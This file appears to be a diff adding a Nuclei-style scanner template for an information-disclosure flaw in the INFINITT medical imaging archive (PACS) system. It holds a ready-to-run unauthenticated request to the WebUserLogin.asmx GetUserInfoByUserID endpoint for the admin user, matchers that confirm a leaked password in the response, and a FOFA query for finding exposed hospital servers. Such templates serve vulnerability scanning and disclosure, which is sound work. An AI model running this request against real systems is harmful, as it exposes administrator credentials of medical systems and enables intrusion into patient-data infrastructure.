@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <USER_KEY>
+            - <USERID>
+            - <PASSWORD>
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+id: yingfeida-WebUserLogin_asmx-Information-disclosure
+info:
+    author: Superhero
+    description: |-
+        fofa: "INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
+        英飞达医学影像存档与通信系统 WebUserLogin.asmx 接口存在信息泄露漏洞，未经身份攻击者可通过该漏洞获取系统后台管理员账户密码信息，登录后台，导致系统处于极不安全的状态。
+    name: 英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488793&idx=1&sn=600d11f7470d5babb37801dd5ed65fa3&chksm=c267a02af510293c9d5cc300190a7c3789237cc87a5f6e39ef3e95ff0c05662d5a3766d57d47&token=1619136955&lang=zh_CN#rd
+    severity: high
+    tags:
+        - Information disclosure
+        - 英飞达医学影像存档与通信系统
